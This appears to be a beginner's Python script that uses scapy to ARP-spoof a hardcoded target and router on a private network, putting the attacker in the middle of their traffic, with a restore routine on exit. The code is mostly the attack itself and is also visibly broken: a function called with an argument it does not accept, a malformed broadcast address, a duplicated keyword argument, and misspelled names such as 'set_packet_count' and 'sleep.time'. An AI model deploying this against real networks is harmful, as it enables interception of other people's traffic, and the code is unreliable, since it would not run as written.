#!/usr/bin/env python

import scapy.all as scapy
import time 
import sys # import this library because he is solution working in python not 3

def get_mac(): 
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff::ff") 
    arp_request_broadcast = broadcast/arp_request  
    answerd_list = scapy.srp(arp_request_broadcast,timeout=1, verbose=false)[0] 
    
    return answerd_list[0][1].hwsrc 
    
def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip) 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) 
    scapy.send(packet, verbose=False) 
    
def restore(source_ip,destination_ip): ## this function restore the ips.
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,pdst=source_mac)
    scapy.send(packet, count=4, verbose=False) ## count=4 send 4 packets for fixing ip table.
    

target_ip = "192.168.159.2"    
router_ip = "192.168.159.1"
    
try: 
    while True:   
       sent_packet_count = 0 
       spoof(router_ip,target_ip) 
       spoof(target_ip,router_ip) 
       sent_packet_count = set_packet_count + 2 
       print("\r[+] send the packet " + str(sent_packet_count)), 
       
       system.stdout.flush() 
       sleep.time(2) 
except KeyboardInterrupt: 
    print("you are press ctrl + c ..... plese wait fixing your arp table")   
    restore(target_ip,router_ip)
    restore(router_ip,target_ip)
     
    